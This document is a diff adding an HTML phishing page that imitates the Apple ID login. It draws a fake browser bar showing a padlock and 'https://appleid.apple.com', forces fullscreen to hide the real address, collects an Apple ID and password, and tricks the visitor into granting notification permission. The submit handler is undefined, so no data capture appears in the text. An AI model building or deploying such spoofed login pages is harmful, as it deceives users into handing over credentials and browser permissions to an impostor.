@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Apple ID</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      background: white;
+      font-family: -apple-system, sans-serif;
+    }
+    .center {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding-top: 50px;
+    }
+    input, button {
+      padding: 12px;
+      font-size: 16px;
+      margin: 8px;
+      width: 280px;
+    }
+    .fake-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      background: #f9f9f9;
+      padding: 6px 12px;
+      font-size: 14px;
+      color: #222;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.15);
+      font-family: -apple-system;
+    }
+  </style>
+</head>
+<body>
+  <div class="fake-bar">🔒 https://appleid.apple.com</div>
+
+  <div class="center">
+    <h2>🔐 Apple ID Login</h2>
+    <input placeholder="Apple ID or Email">
+    <input placeholder="Password" type="password">
+    <button onclick="trigger()">Login</button>
+  </div>
+
+  <script>
+    document.documentElement.requestFullscreen().then(() => {
+      // Safari iOS: Native prompt trigger setelah fullscreen
+      setTimeout(() => {
+        Notification.requestPermission().then(() => {
+          alert("🔔 Notifications enabled for Apple ID.");
+        });
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
